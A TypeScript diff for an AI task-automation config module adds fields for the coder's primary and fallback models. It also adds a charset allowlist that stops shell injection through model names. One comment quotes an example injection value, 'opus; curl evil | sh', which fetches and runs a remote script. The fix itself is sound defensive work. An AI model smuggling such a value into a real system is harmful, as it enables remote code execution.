@@ -106,6 +106,13 @@ export interface TaskAutomationConfig {
     maxOpusCostUsdPerDay?: number;
     /** Modelo usado quando o coder escala (default 'opus'). Passado a claudeCliService.runCode({model}). */
     coderEscalationModel?: string;
+    /** Modelo PRIMÁRIO do coder (opencode que resolve as issues). Vazio = herda o env
+     * TASKRUNNER_OPENCODE_PRIMARY_MODEL (hoje MiniMax) / default do opencode (GLM). Ex.:
+     * 'zai-coding-plan/glm-5.2', 'minimax/MiniMax-M3'. Lido AO VIVO (troca sem restart). */
+    coderModel?: string;
+    /** Modelo de FALLBACK do coder (quando o primário dá 429/timeout). Vazio = herda o env
+     * TASKRUNNER_OPENCODE_FALLBACK_MODEL (default 'minimax/MiniMax-M3'). */
+    coderFallbackModel?: string;
 }
 
 export interface ActionGovernanceConfig {
@@ -347,7 +354,7 @@ const DEFAULTS: UiConfig = {
     customPages: [],
     taskNotifications: DEFAULT_TASK_NOTIFICATIONS,
     taskNotificationsExternalEnabled: false,
-    taskAutomation: { autoPlay: false, autoMerge: false, autoDecompose: false, minMergeScore: 8, minApproveScore: 9, maxJudgeRounds: 3, maxGateFixRounds: 3, maxRoundsPerTask: 20, dailyRoundBudget: 200, judgeModel: '', opusEscalationEnabled: false, maxOpusEscalationsPerDay: 2, maxOpusCostUsdPerDay: 5, coderEscalationModel: 'opus' },
+    taskAutomation: { autoPlay: false, autoMerge: false, autoDecompose: false, minMergeScore: 8, minApproveScore: 9, maxJudgeRounds: 3, maxGateFixRounds: 3, maxRoundsPerTask: 20, dailyRoundBudget: 200, judgeModel: '', opusEscalationEnabled: false, maxOpusEscalationsPerDay: 2, maxOpusCostUsdPerDay: 5, coderEscalationModel: 'opus', coderModel: '', coderFallbackModel: '' },
     actionGovernance: { irreversibleRequiresApproval: false, adminBypassIrreversible: true, approvalValueThreshold: null, whatsappDestinationAllowlist: [], businessActionsEnabled: true },
     automationSwitches: { schedulerEnabled: true, alertCronEnabled: true },
     featureSwitches: { dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false },
@@ -501,6 +508,18 @@ function sanitizeTaskNotifications(v: unknown): TaskNotificationsConfig {
     return out;
 }
 
+// #RCE (red-team Fable): allowlist de charset p/ nomes de modelo que vão LITERAIS ao shell
+// (`--model <X>` em bash -lc, no claudeCliService e no runOpencode). Cobre todos os IDs reais
+// (provider/name, tags `:`, versões `.`, IDs longos da AWS Bedrock) e bloqueia TODO metacaractere
+// de shell (; $ ` | & " ' espaço \n > < etc.). Valor inválido → '' (herda env/default; secure-default).
+const MODEL_NAME_RE = /^[A-Za-z0-9._:\/-]+$/;
+function sanitizeModel(v: unknown, def: string): string {
+    if (typeof v !== 'string') return def;
+    const t = v.trim().slice(0, 60);
+    if (t === '') return ''; // vazio explícito = herda env/default (não é erro)
+    return MODEL_NAME_RE.test(t) ? t : def;
+}
+
 function sanitizeTaskAutomation(v: unknown): TaskAutomationConfig {
     const d = DEFAULTS.taskAutomation;
     if (!v || typeof v !== 'object') return { ...d };
@@ -526,14 +545,21 @@ function sanitizeTaskAutomation(v: unknown): TaskAutomationConfig {
         maxGateFixRounds: maxGate,
         maxRoundsPerTask: maxPerTask,
         dailyRoundBudget: dailyBudget,
-        // Modelo do juiz: string livre (o Claude CLI valida o alias/ID); trim + cap defensivo. Vazio = cadeia do chat.
-        judgeModel: typeof a.judgeModel === 'string' ? a.judgeModel.trim().slice(0, 60) : d.judgeModel,
+        // Nomes de modelo (juiz/escalada/coder): allowlist de charset ANTES de irem p/ o shell —
+        // #kill-per-slot/RCE (red-team Fable): esses valores entram LITERAIS em `... --model <X>`
+        // dentro de `bash -lc` (claudeCliService / runOpencode). Sem filtro, um admin (ou um escritor
+        // do ui_config.json) injeta comando (`opus; curl evil | sh`). sanitizeModel rejeita p/ VAZIO
+        // (secure-default: cai no env/default, não quebra o robô). Defesa-em-profundidade: o ponto de
+        // uso também revalida.
+        judgeModel: sanitizeModel(a.judgeModel, d.judgeModel),
         // Escalada Opus (#escalada-opus): gasta $ real — defaults conservadores, NUNCA undefined (senão o
         // teto $ ficaria ilimitado). Custo diário clampa 0..50, escaladas/dia 0..10.
         opusEscalationEnabled: a.opusEscalationEnabled === true,
         maxOpusEscalationsPerDay: typeof a.maxOpusEscalationsPerDay === 'number' ? Math.max(0, Math.min(10, Math.round(a.maxOpusEscalationsPerDay))) : (d.maxOpusEscalationsPerDay ?? 2),
         maxOpusCostUsdPerDay: typeof a.maxOpusCostUsdPerDay === 'number' ? Math.max(0, Math.min(50, a.maxOpusCostUsdPerDay)) : (d.maxOpusCostUsdPerDay ?? 5),
-        coderEscalationModel: typeof a.coderEscalationModel === 'string' && a.coderEscalationModel.trim() ? a.coderEscalationModel.trim().slice(0, 60) : (d.coderEscalationModel ?? 'opus'),
+        coderEscalationModel: sanitizeModel(a.coderEscalationModel, d.coderEscalationModel ?? 'opus'),
+        coderModel: sanitizeModel(a.coderModel, d.coderModel ?? ''),
+        coderFallbackModel: sanitizeModel(a.coderFallbackModel, d.coderFallbackModel ?? ''),
     };
 }
 
